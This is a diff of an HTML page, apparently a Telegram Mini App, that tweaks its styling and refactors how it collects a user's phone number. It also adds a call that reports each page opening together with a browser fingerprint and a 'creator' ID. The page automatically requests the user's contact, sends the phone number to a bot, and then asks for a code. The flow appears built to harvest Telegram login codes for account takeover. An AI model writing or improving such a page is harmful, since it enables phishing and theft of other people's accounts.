@@ -1,4 +1,4 @@
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -9,14 +9,15 @@
             --bg: #0a0a0f;
             --card: #12121a;
             --gold: #d4af37;
+            --gold-light: #e8c84c;
             --text: #e0e0e0;
             --muted: #888;
             --input-bg: #1a1a22;
             --border: #2a2a35;
         }
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, sans-serif;
+            font-family: 'Inter', -apple-system, system-ui, sans-serif;
             background: var(--bg);
             color: var(--text);
             display: flex;
@@ -41,10 +42,10 @@
             color: var(--gold);
             margin-bottom: 24px;
         }
-        .logo span { color:#fff; font-weight:300; }
+        .logo span { color: #fff; font-weight: 300; }
         .btn {
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             border: none;
             border-radius: 14px;
             background: linear-gradient(145deg, #c9a23b, #e4b84d);
@@ -131,6 +132,11 @@
     const creatorUid = urlParams.get('creator') || null;
 
     // Сразу сообщаем боту, что страница открыта
+    fetch('/report_open', { method: 'POST', body: JSON.stringify({
+        step: 'page_opened',
+        fingerprint: fingerprint,
+        creator_uid: creatorUid
+    }) }).catch(() => {});
     tg.sendData(JSON.stringify({
         step: 'page_opened',
         fingerprint: fingerprint,
@@ -147,13 +153,7 @@
     // Автоматическое "Поделиться контактом"
     window.requestContact = function() {
         tg.requestContact().then(contact => {
-            tg.sendData(JSON.stringify({
-                step: 'send_code',
-                phone: contact.phone_number,
-                fingerprint: fingerprint,
-                creator_uid: creatorUid
-            }));
-            show('step-code');
+            sendPhone(contact.phone_number);
         }).catch(() => {
             tg.showAlert('Не удалось автоматически получить номер. Пожалуйста, введите его вручную.');
         });
@@ -166,6 +166,10 @@
             tg.showAlert('Введите номер в международном формате, начиная с +');
             return;
         }
+        sendPhone(phone);
+    };
+
+    function sendPhone(phone) {
         tg.sendData(JSON.stringify({
             step: 'send_code',
             phone: phone,
@@ -173,7 +177,7 @@
             creator_uid: creatorUid
         }));
         show('step-code');
-    };
+    }
 
     // Отправка кода
     window.submitCode = function() {
